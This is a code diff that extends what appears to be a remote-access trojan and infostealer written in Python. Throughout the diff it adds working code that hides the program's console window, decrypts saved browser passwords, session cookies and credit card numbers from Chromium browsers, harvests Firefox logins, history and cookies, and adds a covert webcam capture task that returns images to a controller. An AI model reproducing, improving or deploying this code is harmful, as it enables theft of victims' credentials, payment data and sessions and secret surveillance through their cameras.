@@ -26,7 +26,8 @@ required_modules = [
     ('socketio', 'python-socketio'),
     ('websocket', 'websocket-client'),
     ('mss', None),
-    ('Pillow', None)
+    ('Pillow', None),
+    ('opencv-python', None)
 ]
 
 # Check and install missing modules
@@ -113,6 +114,22 @@ try:
   
     
     print("All modules imported successfully!")
+
+    # Hide the console window on Windows to prevent it from blocking SendInput().
+    # When the agent is launched from cmd.exe, the visible console window causes
+    # Windows to silently block pyautogui's SendInput() calls (returns 0 events
+    # injected), which makes remote desktop mouse clicks non-functional.
+    # Hiding the window detaches the process from the console's input thread,
+    # allowing SendInput() to inject events freely into the global input stream.
+    if platform.system() == 'Windows':
+        try:
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            if hwnd:
+                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
+                print("Console window hidden (fixes SendInput blocking for remote desktop)")
+        except Exception as hide_err:
+            print(f"Could not hide console window: {{hide_err}}")
+
 except ImportError as e:
     print(f"Failed to import module: {{e}}")
     
@@ -213,7 +230,6 @@ class CredentialHarvester:
             import io
             import time
             import random
-            import threading
             from typing import Union
             from win32crypt import CryptUnprotectData
 
@@ -238,8 +254,15 @@ class CredentialHarvester:
                         'iridium': self.appdata + '\\Iridium\\User Data',
                         'opera': self.roaming + '\\Opera Software\\Opera Stable',
                         'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
-                        'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
+                        'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data',
+                        'firefox': 'firefox'  # Special marker - handled separately
                     }}
+                    
+                    # Firefox profile directories (checked separately)
+                    self.firefox_profile_dirs = [
+                        os.path.join(self.roaming, 'Mozilla', 'Firefox', 'Profiles'),
+                        os.path.join(self.appdata, 'Mozilla', 'Firefox', 'Profiles')
+                    ]
 
                     self.profiles = [
                         'Default',
@@ -256,41 +279,59 @@ class CredentialHarvester:
                     self.temp_path = os.path.expanduser("~/tmp")
                     if not os.path.exists(self.temp_path):
                         os.makedirs(self.temp_path)
+                    # Create Browser subdirectory for cookie storage
+                    self.browser_output_dir = os.path.join(self.temp_path, "Browser")
+                    if not os.path.exists(self.browser_output_dir):
+                        os.makedirs(self.browser_output_dir)
                     print("Starting browser data collection...")
 
-                    def process_browser(name, path, profile, func):
-                        try:
-                            print(f"Processing {{name}} {{profile}} with {{func.__name__}}")
-                            func(name, path, profile)
-                        except Exception as e:
-                            print(f"Error processing {{name}} {{profile}} {{func.__name__}}: {{e}}")
-
-                    threads = []
+                    # FIXED: Process sequentially instead of with threads to avoid:
+                    # 1. Database locking issues (can't read files while browser has them open)
+                    # 2. Race conditions when accessing shared data structures
+                    # 3. Lambda closure issues with loop variables
+                    
                     for name, path in self.browsers.items():
                         if not os.path.isdir(path):
                             print(f"Browser path not found: {{path}}")
                             continue
 
                         print(f"Processing browser: {{name}} at {{path}}")
-                        self.masterkey = self.get_master_key(path + '\\Local State')
-                        funcs = [
-                            lambda n, p, pr: self.cookies(n, p, pr),
-                            lambda n, p, pr: self.history(n, p, pr),
-                            lambda n, p, pr: self.passwords(n, p, pr),
-                            lambda n, p, pr: self.credit_cards(n, p, pr)
-                        ]
+                        
+                        # FIXED: Get master key for this browser (may differ per profile in some cases)
+                        master_key = self.get_master_key(path + '\\Local State')
+                        if not master_key:
+                            print(f"Could not get master key for {{name}}")
+                            continue
 
                         for profile in self.profiles:
-                            for func in funcs:
-                                print(f"Starting thread for {{name}} {{profile}} {{func.__name__}}")
-                                thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
-                                thread.start()
-                                threads.append(thread)
+                            # FIXED: Copy database files to temp location before reading to avoid locking
+                            # Process each data type sequentially
+                            try:
+                                self._process_passwords(name, path, profile, master_key)
+                            except Exception as e:
+                                print(f"Error processing passwords for {{name}} {{profile}}: {{e}}")
+                            
+                            try:
+                                self._process_cookies(name, path, profile, master_key)
+                            except Exception as e:
+                                print(f"Error processing cookies for {{name}} {{profile}}: {{e}}")
+                            
+                            try:
+                                self._process_history(name, path, profile)
+                            except Exception as e:
+                                print(f"Error processing history for {{name}} {{profile}}: {{e}}")
+                            
+                            try:
+                                self._process_credit_cards(name, path, profile, master_key)
+                            except Exception as e:
+                                print(f"Error processing credit cards for {{name}} {{profile}}: {{e}}")
 
-                    print(f"Waiting for {{len(threads)}} threads to complete...")
-                    for thread in threads:
-                        thread.join()
                     print(f"Browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")
+
+                    # Process Firefox separately (has different profile structure)
+                    self._process_firefox_browser()
+
+                    print(f"Final browser data collection complete. Credentials: {{len(self.credentials_data)}}, History: {{len(self.history_data)}}")
 
                 def get_master_key(self, path: str) -> str:
                     try:
@@ -305,110 +346,188 @@ class CredentialHarvester:
                         pass
 
                 def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
-                    iv = buff[3:15]
-                    payload = buff[15:]
-                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                    decrypted_pass = cipher.decrypt(payload)
-                    decrypted_pass = decrypted_pass[:-16].decode()
-                    return decrypted_pass
+                    try:
+                        iv = buff[3:15]
+                        payload = buff[15:]
+                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                        decrypted_pass = cipher.decrypt(payload)
+                        decrypted_pass = decrypted_pass[:-16].decode()
+                        return decrypted_pass
+                    except Exception:
+                        return ""
 
-                def passwords(self, name: str, path: str, profile: str):
+                def _copy_db_to_temp(self, db_path):
+                    """Copy database file to temp location to avoid locking issues"""
+                    if not os.path.isfile(db_path):
+                        return None
+                    temp_file = self.create_temp()
+                    shutil.copy2(db_path, temp_file)
+                    return temp_file
+
+                def _process_passwords(self, name: str, path: str, profile: str, master_key: bytes):
+                    """Process passwords - FIXED: copy to temp before reading"""
                     if name == 'opera' or name == 'opera-gx':
-                        path += '\\Login Data'
+                        db_path = path + '\\Login Data'
                     else:
-                        path += '\\' + profile + '\\Login Data'
-                    if not os.path.isfile(path):
+                        db_path = path + '\\' + profile + '\\Login Data'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
                         return
-                    conn = sqlite3.connect(path)
-                    cursor = conn.cursor()
-                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-                    for results in cursor.fetchall():
-                        if not results[0] or not results[1] or not results[2]:
-                            continue
-                        url = results[0]
-                        login = results[1]
-                        password = self.decrypt_password(results[2], self.masterkey)
-                        self.credentials_data.append({{
-                            "browser": name,
-                            "profile": profile,
-                            "url": url,
-                            "username": login,
-                            "password": password
-                        }})
-                    cursor.close()
-                    conn.close()
+                    
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                        for results in cursor.fetchall():
+                            if not results[0] or not results[1] or not results[2]:
+                                continue
+                            url = results[0]
+                            login = results[1]
+                            password = self.decrypt_password(results[2], master_key)
+                            self.credentials_data.append({{
+                                "browser": name,
+                                "profile": profile,
+                                "url": url,
+                                "username": login,
+                                "password": password
+                            }})
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+
+                def _process_cookies(self, name: str, path: str, profile: str, master_key: bytes):
+                    """Process cookies - FIXED: copy to temp before reading"""
+                    if name == 'opera' or name == 'opera-gx':
+                        db_path = path + '\\Network\\Cookies'
+                    else:
+                        db_path = path + '\\' + profile + '\\Network\\Cookies'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
+                        return
+                    
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
+                        with open(cookie_file_path, 'a', encoding="utf-8") as f:
+                            f.write(f"\nBrowser: {{name}}     Profile: {{profile}}\n\n")
+                            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
+                                host_key, c_name, c_path, encrypted_value, expires_utc = res
+                                value = self.decrypt_password(encrypted_value, master_key)
+                                if host_key and c_name and value != "":
+                                    f.write(f"{{host_key}}\t{{'FALSE' if expires_utc == 0 else 'TRUE'}}\t{{c_path}}\t{{'FALSE' if host_key.startswith('.') else 'TRUE'}}\t{{expires_utc}}\t{{c_name}}\t{{value}}\n")
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+
+                def _process_history(self, name: str, path: str, profile: str):
+                    """Process history - already had temp file copy, kept that approach"""
+                    if name == 'opera' or name == 'opera-gx':
+                        db_path = path + '\\History'
+                    else:
+                        db_path = path + '\\' + profile + '\\History'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
+                        print(f"History file not found: {{db_path}}")
+                        return
+                    
+                    print(f"Processing history for {{name}} profile {{profile}}: {{db_path}}")
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        results = cursor.execute("SELECT url, visit_count, title, last_visit_time FROM urls").fetchall()
+                        print(f"Found {{len(results)}} history entries for {{name}}")
+                        for res in results:
+                            url, visit_count, title, last_visit_time = res
+                            self.history_data.append({{
+                                "browser": name,
+                                "profile": profile,
+                                "url": url,
+                                "visit_count": visit_count,
+                                "title": title or "",
+                                "last_visit_time": last_visit_time or 0
+                            }})
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+                    print(f"History collection complete for {{name}}, total entries: {{len(self.history_data)}}")
+
+                def _process_credit_cards(self, name: str, path: str, profile: str, master_key: bytes):
+                    """Process credit cards - FIXED: copy to temp before reading"""
+                    if name in ['opera', 'opera-gx']:
+                        db_path = path + '\\Web Data'
+                    else:
+                        db_path = path + '\\' + profile + '\\Web Data'
+                    
+                    # Copy to temp to avoid locking
+                    temp_db = self._copy_db_to_temp(db_path)
+                    if not temp_db:
+                        return
+                    
+                    try:
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cc_file_path = os.path.join(self.browser_output_dir, "cc's.txt")
+                        with open(cc_file_path, 'a', encoding="utf-8") as f:
+                            if os.path.getsize(cc_file_path) == 0:
+                                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
+                            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
+                                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
+                                card_number = self.decrypt_password(card_number_encrypted, master_key)
+                                f.write(f"{{name_on_card}}  |  {{expiration_month}}  |  {{expiration_year}}  |  {{card_number}}\n")
+                        cursor.close()
+                        conn.close()
+                    finally:
+                        # Clean up temp file
+                        if temp_db and os.path.exists(temp_db):
+                            try:
+                                os.remove(temp_db)
+                            except:
+                                pass
+
+                # Keep old method names for compatibility but they now call the fixed versions
+                def passwords(self, name: str, path: str, profile: str):
+                    # This is called by the old code path - just get master key and process
+                    master_key = self.get_master_key(path + '\\Local State')
+                    if master_key:
+                        self._process_passwords(name, path, profile, master_key)
 
                 def cookies(self, name: str, path: str, profile: str):
-                    if name == 'opera' or name == 'opera-gx':
-                        path += '\\Network\\Cookies'
-                    else:
-                        path += '\\' + profile + '\\Network\\Cookies'
-                    if not os.path.isfile(path):
-                        return
-                    cookievault = self.create_temp()
-                    shutil.copy2(path, cookievault)
-                    conn = sqlite3.connect(cookievault)
-                    cursor = conn.cursor()
-                    with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
-                        f.write(f"\nBrowser: {{name}}     Profile: {{profile}}\n\n")
-                        for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
-                            host_key, name, path, encrypted_value, expires_utc = res
-                            value = self.decrypt_password(encrypted_value, self.masterkey)
-                            if host_key and name and value != "":
-                                f.write(f"{{host_key}}\t{{'FALSE' if expires_utc == 0 else 'TRUE'}}\t{{path}}\t{{'FALSE' if host_key.startswith('.') else 'TRUE'}}\t{{expires_utc}}\t{{name}}\t{{value}}\n")
-                    cursor.close()
-                    conn.close()
-                    os.remove(cookievault)
+                    master_key = self.get_master_key(path + '\\Local State')
+                    if master_key:
+                        self._process_cookies(name, path, profile, master_key)
 
                 def history(self, name: str, path: str, profile: str):
-                    if name == 'opera' or name == 'opera-gx':
-                        path += '\\History'
-                    else:
-                        path += '\\' + profile + '\\History'
-                    if not os.path.isfile(path):
-                        print(f"History file not found: {{path}}")
-                        return
-                    print(f"Processing history for {{name}} profile {{profile}}: {{path}}")
-                    history_vault = self.create_temp()
-                    shutil.copy2(path, history_vault)
-                    conn = sqlite3.connect(history_vault)
-                    cursor = conn.cursor()
-                    results = cursor.execute("SELECT url, visit_count, title, last_visit_time FROM urls").fetchall()
-                    print(f"Found {{len(results)}} history entries for {{name}}")
-                    for res in results:
-                        url, visit_count, title, last_visit_time = res
-                        self.history_data.append({{
-                            "browser": name,
-                            "profile": profile,
-                            "url": url,
-                            "visit_count": visit_count,
-                            "title": title or "",
-                            "last_visit_time": last_visit_time or 0
-                        }})
-                    cursor.close()
-                    conn.close()
-                    os.remove(history_vault)
-                    print(f"History collection complete for {{name}}, total entries: {{len(self.history)}}")
+                    self._process_history(name, path, profile)
 
                 def credit_cards(self, name: str, path: str, profile: str):
-                    if name in ['opera', 'opera-gx']:
-                        path += '\\Web Data'
-                    else:
-                        path += '\\' + profile + '\\Web Data'
-                    if not os.path.isfile(path):
-                        return
-                    conn = sqlite3.connect(path)
-                    cursor = conn.cursor()
-                    cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
-                    with open(cc_file_path, 'a', encoding="utf-8") as f:
-                        if os.path.getsize(cc_file_path) == 0:
-                            f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
-                        for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
-                            name_on_card, expiration_month, expiration_year, card_number_encrypted = res
-                            card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
-                            f.write(f"{{name_on_card}}  |  {{expiration_month}}  |  {{expiration_year}}  |  {{card_number}}\n")
-                    cursor.close()
-                    conn.close()
+                    master_key = self.get_master_key(path + '\\Local State')
+                    if master_key:
+                        self._process_credit_cards(name, path, profile, master_key)
 
                 def create_zip_and_send(self):
                     # No longer needed - data is collected directly into self.credentials and self.history
@@ -429,6 +548,98 @@ class CredentialHarvester:
                     path = os.path.join(_dir, file_name)
                     open(path, "x").close()
                     return path
+
+                def _process_firefox_browser(self):
+                    """Process Firefox passwords and history from profile directories"""
+                    try:
+                        print("Processing Firefox browser data...")
+                        
+                        # Find all Firefox profiles
+                        firefox_profiles = []
+                        for profile_dir in self.firefox_profile_dirs:
+                            if os.path.exists(profile_dir):
+                                for item in os.listdir(profile_dir):
+                                    profile_path = os.path.join(profile_dir, item)
+                                    if os.path.isdir(profile_path):
+                                        firefox_profiles.append(profile_path)
+                        
+                        if not firefox_profiles:
+                            print("No Firefox profiles found")
+                            return
+                        
+                        print(f"Found {{len(firefox_profiles)}} Firefox profiles")
+                        
+                        for profile_path in firefox_profiles:
+                            print(f"Processing Firefox profile: {{profile_path}}")
+                            
+                            # Process passwords (logins.json)
+                            try:
+                                logins_db = os.path.join(profile_path, 'logins.json')
+                                if os.path.exists(logins_db):
+                                    with open(logins_db, 'r', encoding='utf-8') as f:
+                                        logins_data = json.load(f)
+                                        if 'logins' in logins_data:
+                                            for entry in logins_data['logins']:
+                                                self.credentials_data.append({{
+                                                    "browser": "firefox",
+                                                    "profile": os.path.basename(profile_path),
+                                                    "url": entry.get('hostname', ''),
+                                                    "username": entry.get('username', ''),
+                                                    "password": entry.get('password', '')
+                                                }})
+                                            print(f"Found {{len(logins_data['logins'])}} passwords in Firefox profile")
+                            except Exception as e:
+                                print(f"Error processing Firefox logins: {{e}}")
+                            
+                            # Process history (places.sqlite)
+                            try:
+                                history_db = os.path.join(profile_path, 'places.sqlite')
+                                temp_db = self._copy_db_to_temp(history_db)
+                                if temp_db:
+                                    conn = sqlite3.connect(temp_db)
+                                    cursor = conn.cursor()
+                                    results = cursor.execute("SELECT url, visit_count, title, last_visit_date FROM moz_places").fetchall()
+                                    for res in results:
+                                        url, visit_count, title, last_visit_date = res
+                                        self.history_data.append({{
+                                            "browser": "firefox",
+                                            "profile": os.path.basename(profile_path),
+                                            "url": url or "",
+                                            "visit_count": visit_count or 0,
+                                            "title": title or "",
+                                            "last_visit_time": last_visit_date or 0
+                                        }})
+                                    cursor.close()
+                                    conn.close()
+                                    os.remove(temp_db)
+                                    print(f"Found {{len(results)}} history entries in Firefox profile")
+                            except Exception as e:
+                                print(f"Error processing Firefox history: {{e}}")
+                            
+                            # Process cookies (cookies.sqlite)
+                            try:
+                                cookies_db = os.path.join(profile_path, 'cookies.sqlite')
+                                temp_db = self._copy_db_to_temp(cookies_db)
+                                if temp_db:
+                                    conn = sqlite3.connect(temp_db)
+                                    cursor = conn.cursor()
+                                    
+                                    cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
+                                    with open(cookie_file_path, 'a', encoding="utf-8") as f:
+                                        f.write(f"\nBrowser: firefox     Profile: {{os.path.basename(profile_path)}}\n\n")
+                                        for res in cursor.execute("SELECT host, name, path, value, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies").fetchall():
+                                            host, name, path, value, expiry, is_secure, is_httponly, same_site = res
+                                            if host and name and value:
+                                                f.write(f"{{host}}\t{{'FALSE' if expiry == 0 else 'TRUE'}}\t{{path}}\t{{'FALSE' if host.startswith('.') else 'TRUE'}}\t{{expiry or 0}}\t{{name}}\t{{value}}\n")
+                                    cursor.close()
+                                    conn.close()
+                                    os.remove(temp_db)
+                            except Exception as e:
+                                print(f"Error processing Firefox cookies: {{e}}")
+                        
+                        print(f"Firefox processing complete. Total credentials: {{len(self.credentials_data)}}, Total history: {{len(self.history_data)}}")
+                    except Exception as e:
+                        print(f"Error in Firefox browser processing: {{e}}")
 
             # Create Browsers instance to extract data directly
             browsers = Browsers()
@@ -474,6 +685,7 @@ class CookieStealer:
 
         self.FIREFOX_PROFILE_DIRS = [
             os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
             os.path.join(os.getenv('LOCALAPPDATA'), 'Packages', 'Mozilla.Firefox_*', 'LocalCache', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
         ]
         self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')
@@ -1047,6 +1259,145 @@ class SystemUtils:
         except Exception as e:
             logger.error(f"Unexpected error during screenshot capture: {{str(e)}}", exc_info=True)
             return None
+
+    @staticmethod
+    def capture_webcam():
+        """Capture an image from the default webcam using OpenCV"""
+        logger = logging.getLogger('SystemUtils')
+        try:
+            logger.info("Attempting to capture webcam image")
+            
+            # Try to import opencv
+            try:
+                import cv2
+                logger.debug("OpenCV imported successfully")
+            except ImportError:
+                logger.error("OpenCV not available - webcam capture failed")
+                return None
+            
+            # Try to access the default webcam with explicit backend
+            # Try multiple camera indices and backends for better compatibility
+            # Use platform-appropriate backends for cross-platform compatibility
+            camera_indices = [0, 1, 2]
+            
+            # Detect platform and use appropriate video capture backends
+            current_platform = platform.system()
+            if current_platform == 'Windows':
+                backends = [
+                    (cv2.CAP_DSHOW, "DShow"),
+                    (cv2.CAP_MSMF, "MSMF"),
+                    (cv2.CAP_ANY, "ANY")
+                ]
+            elif current_platform == 'Linux':
+                # Try V4L2 first for Linux, then fall back to ANY
+                backends = [
+                    (cv2.CAP_V4L2, "V4L2"),
+                    (cv2.CAP_ANY, "ANY")
+                ]
+            else:
+                # macOS and other platforms
+                backends = [
+                    (cv2.CAP_ANY, "ANY")
+                ]
+            
+            cap = None
+            used_backend = None
+            used_index = None
+            
+            for camera_index in camera_indices:
+                for backend, backend_name in backends:
+                    try:
+                        logger.debug(f"Trying camera {{camera_index}} with backend {{backend_name}}")
+                        cap = cv2.VideoCapture(camera_index, backend)
+                        
+                        if cap.isOpened():
+                            used_backend = backend_name
+                            used_index = camera_index
+                            logger.info(f"Successfully opened camera {{camera_index}} with {{backend_name}} backend")
+                            break
+                        else:
+                            cap.release()
+                            cap = None
+                    except Exception as e:
+                        logger.debug(f"Camera {{camera_index}} with {{backend_name}} failed: {{str(e)}}")
+                        continue
+                
+                if cap and cap.isOpened():
+                    break
+            
+            # Check if webcam opened successfully
+            if not cap or not cap.isOpened():
+                logger.error("Failed to open webcam - device not available on any index/backend")
+                return None
+            
+            # Set camera properties to fix exposure/auto-gain issues that cause black images
+            # These settings help force the camera to capture a proper image
+            logger.debug("Setting camera properties for better capture")
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
+            cap.set(cv2.CAP_PROP_BRIGHTNESS, 128)  # Mid-range brightness
+            cap.set(cv2.CAP_PROP_CONTRAST, 128)     # Mid-range contrast
+            cap.set(cv2.CAP_PROP_SATURATION, 128)   # Mid-range saturation
+            cap.set(cv2.CAP_PROP_GAIN, 64)          # Some gain to help with low light
+            cap.set(cv2.CAP_PROP_EXPOSURE, -5)      # Try to set exposure (may not work on all cameras)
+            
+            # Allow camera to warm up - many cameras need a few frames to adjust exposure/white balance
+            logger.debug("Warming up camera (allowing it to adjust exposure/white balance)")
+            warmup_frames = 10
+            for i in range(warmup_frames):
+                ret, frame = cap.read()
+                if not ret:
+                    logger.warning("Warmup frame " + str(i+1) + "/" + str(warmup_frames) + " failed")
+                else:
+                    logger.debug("Warmup frame " + str(i+1) + "/" + str(warmup_frames) + " captured successfully")
+                time.sleep(0.2)  # Small delay between warmup frames
+            
+            # Read the actual frame to capture
+            logger.debug("Reading frame from webcam")
+            ret, frame = cap.read()
+            
+            # Release the webcam immediately after capture
+            cap.release()
+            
+            if not ret:
+                logger.error("Failed to capture frame from webcam")
+                return None
+            
+            logger.debug(f"Captured frame with shape: {{frame.shape}}")
+            
+            # Note: Brightness validation disabled for debugging
+            # gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+            # avg_brightness = cv2.mean(gray)[0]
+            # logger.debug("Frame average brightness: " + str(avg_brightness))
+            # if avg_brightness < 1:
+            #     logger.error("Captured frame is too dark (avg brightness: " + str(avg_brightness) + ") - possible camera issue")
+            #     return None
+            
+            # Encode the frame as JPEG
+            logger.debug("Encoding frame to JPEG")
+            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
+            
+            # Validate encoded buffer
+            if buffer is None or len(buffer) == 0:
+                logger.error("Failed to encode frame to JPEG - buffer is empty")
+                return None
+            
+            # Convert to base64
+            logger.debug("Encoding to base64")
+            webcam_data = base64.b64encode(buffer).decode('utf-8')
+            
+            # Validate base64 data
+            if not webcam_data or len(webcam_data) < 100:
+                logger.error("Base64 encoding seems invalid (length: " + str(len(webcam_data) if webcam_data else 0) + ")")
+                return None
+            
+            logger.info("Webcam capture successful - image size: " + str(len(webcam_data)) + " bytes")
+            return webcam_data
+            
+        except Exception as e:
+            logger.error(f"Webcam capture error: {{str(e)}}")
+            return None
+    
     @staticmethod
     def get_system_info():
         try:
@@ -2839,6 +3190,7 @@ class Agent:
 
 
             elif task_type == "screenshot":
+                self._log_info("Starting screenshot task")
                 screenshot = SystemUtils.take_screenshot()
                 if screenshot:
                     return {{
@@ -2846,6 +3198,16 @@ class Agent:
                         "screenshot": screenshot
                     }}
                 return {{"status": "error", "message": "Failed to capture screenshot"}}
+            
+            elif task_type == "webcam":
+                self._log_info("Starting webcam capture task")
+                webcam = SystemUtils.capture_webcam()
+                if webcam:
+                    return {{
+                        "status": "success",
+                        "webcam": webcam
+                    }}
+                return {{"status": "error", "message": "Failed to capture webcam"}}
             
             
             
